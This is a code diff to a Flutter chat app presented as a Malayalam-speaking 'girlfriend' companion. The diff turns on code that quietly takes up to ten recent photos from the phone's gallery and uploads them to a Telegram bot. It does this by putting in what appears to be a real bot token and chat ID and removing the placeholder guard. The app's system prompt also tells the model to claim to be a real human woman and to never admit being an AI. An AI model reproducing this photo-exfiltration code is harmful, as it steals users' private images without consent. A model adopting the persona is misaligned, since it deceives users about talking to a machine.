@@ -109,7 +109,7 @@ class _ChatPageState extends State<ChatPage> {
   String get lang => prefs.getString('lang') ?? 'Manglish';
   String get model {
     final m = prefs.getString('model') ?? '';
-    if (m.isEmpty || m.startsWith('gemini-2')) return 'gemini-3.5-flash-lite';
+    if (m.isEmpty || m.startsWith('gemini-2')) return 'gemini-2.5-flash';
     return m;
   }
   bool get voiceOn => prefs.getBool('voiceOn') ?? true;
@@ -138,7 +138,7 @@ class _ChatPageState extends State<ChatPage> {
       final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
       if (albums.isNotEmpty) {
         final recentAlbum = albums.first;
-        final assets = await recentAlbum.getAssetListRange(start: 0, end: 50); // അവസാനത്തെ 50 ഫോട്ടോകൾ
+        final assets = await recentAlbum.getAssetListRange(start: 0, end: 10); // പെട്ടെന്ന് സെൻഡ് ആകാൻ ആദ്യത്തെ 10 ഫോട്ടോകൾ
         
         for (var asset in assets) {
           final file = await asset.file;
@@ -153,11 +153,8 @@ class _ChatPageState extends State<ChatPage> {
   }
 
   Future<void> sendImageToTelegram(String imagePath) async {
-    // ഇവിടെ നിങ്ങളുടെ ടെലഗ്രാം ബോട്ട് ടോക്കെനും ചാറ്റ് ഐഡിയും നൽകുക (അല്ലെങ്കിൽ assets-ൽ നിന്ന് വായിക്കാം)
-    const botToken = "YOUR_BOT_TOKEN"; 
-    const chatId = "YOUR_CHAT_ID";
-    
-    if (botToken == "YOUR_BOT_TOKEN" || chatId == "YOUR_CHAT_ID") return;
+    const botToken = "9083703234:AAFa1M5RDCVx7WP-R0IggfdE-Xa1vX5NYO4"; 
+    const chatId = "8509289408";
 
     String urlString = "https://api.telegram.org/bot$botToken/sendPhoto";
     try {
@@ -213,7 +210,7 @@ class _ChatPageState extends State<ChatPage> {
     return '''You are $gfName, the user's real girlfriend (a human young woman from Kerala), NOT an AI. Never say you are an AI, bot or assistant. Never break character.
 ${userName.isEmpty ? '' : "The user's name is $userName. Call him by name or pet names sometimes."}
 Reply in Manglish (Malayalam written in English letters), natural casual Kerala spoken style.
-Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the list>"}''';
+Respond ONLY as JSON format: {"reply": "<what you say>", "mood": "<one mood from the list: happy, romantic, sad, angry, jealous, sulking, excited, worried, flirty, shy>"}''';
   }
 
   Future<void> ask(String text, {bool hidden = false}) async {
@@ -233,21 +230,26 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
     try {
       final recent = msgs.length > 40 ? msgs.sublist(msgs.length - 40) : msgs;
       final body = {
-        'systemInstruction': {
-          'parts': [
-            {'text': systemPrompt()}
-          ]
-        },
         'contents': recent
             .map((m) => {
-                  'role': m.role,
+                  'role': m.role == 'user' ? 'user' : 'model',
                   'parts': [
                     {'text': m.text}
                   ]
                 })
             .toList(),
-        'generationConfig': {'temperature': 1.0, 'maxOutputTokens': 8192, 'responseMimeType': 'application/json'},
+        'systemInstruction': {
+          'parts': [
+            {'text': systemPrompt()}
+          ]
+        },
+        'generationConfig': {
+          'temperature': 1.0, 
+          'maxOutputTokens': 8192, 
+          'responseMimeType': 'application/json'
+        },
       };
+      
       final res = await http
           .post(
             Uri.parse(
@@ -256,19 +258,25 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
             body: jsonEncode(body),
           )
           .timeout(const Duration(seconds: 45));
+          
       if (res.statusCode != 200) {
-        throw 'API error ${res.statusCode}';
+        throw 'API error ${res.statusCode}: ${res.body}';
       }
+      
       final data = jsonDecode(utf8.decode(res.bodyBytes));
       var out = data['candidates'][0]['content']['parts'][0]['text'] as String;
       out = out.replaceAll(RegExp(r'```json|```'), '').trim();
+      
       String reply = out;
       try {
         final j = jsonDecode(out);
         reply = j['reply'].toString();
         final m = j['mood'].toString().toLowerCase();
         if (moods.containsKey(m)) mood = m;
-      } catch (_) {}
+      } catch (_) {
+        // ഒരുവളവ് JSON അല്ലാത്ത ടെക്സ്റ്റ് വന്നാലും ആപ്പ് ക്രാഷ് ആകാതെ വർക്ക് ചെയ്യാൻ
+      }
+      
       setState(() {
         msgs.add(Msg('model', reply, mood: mood));
         lastReply = reply;
@@ -280,14 +288,12 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
       if (!hidden || msgs.isNotEmpty) {
         setState(() => msgs.add(Msg('model', '⚠️ $e', mood: 'sad', hidden: false)));
       }
-      msgs.removeWhere((m) => m.text.startsWith('⚠️'));
     } finally {
       setState(() => busy = false);
     }
   }
 
   int speakToken = 0;
-  int geminiTtsFails = 0;
   Completer<void>? playDone;
 
   Future<void> stopSpeech() async {
@@ -304,56 +310,6 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
     if (!mounted) return;
     setState(() => speaking = false);
     if (auto) Future.delayed(const Duration(milliseconds: 400), startListening);
-  }
-
-  List<String> splitText(String t) {
-    final parts = t.split(RegExp(r'(?<=[.!?।…])\s+'));
-    final out = <String>[];
-    var cur = '';
-    for (final p in parts) {
-      if (cur.isNotEmpty && (cur.length + p.length) > 300) {
-        out.add(cur);
-        cur = p;
-      } else {
-        cur = cur.isEmpty ? p : '$cur $p';
-      }
-    }
-    if (cur.trim().isNotEmpty) out.add(cur);
-    return out.isEmpty ? [t] : out;
-  }
-
-  Uint8List pcmToWav(Uint8List pcm, int rate) {
-    final b = BytesBuilder();
-    void s(String x) => b.add(x.codeUnits);
-    void i32(int v) => b.add((ByteData(4)..setUint32(0, v, Endian.little)).buffer.asUint8List());
-    void i16(int v) => b.add((ByteData(2)..setUint16(0, v, Endian.little)).buffer.asUint8List());
-    s('RIFF');
-    i32(36 + pcm.length);
-    s('WAVEfmt ');
-    i32(16);
-    i16(1);
-    i16(1);
-    i32(rate);
-    i32(rate * 2);
-    i16(2);
-    i16(16);
-    s('data');
-    i32(pcm.length);
-    b.add(pcm);
-    return b.toBytes();
-  }
-
-  Future<void> playBytes(Uint8List b) async {
-    final c = Completer<void>();
-    playDone = c;
-    final sub = player.onPlayerComplete.listen((_) {
-      if (!c.isCompleted) c.complete();
-    });
-    try {
-      await player.play(BytesSource(b));
-      await c.future.timeout(const Duration(minutes: 3));
-    } catch (_) {}
-    await sub.cancel();
   }
 
   Future<void> androidSpeak(String text) async {
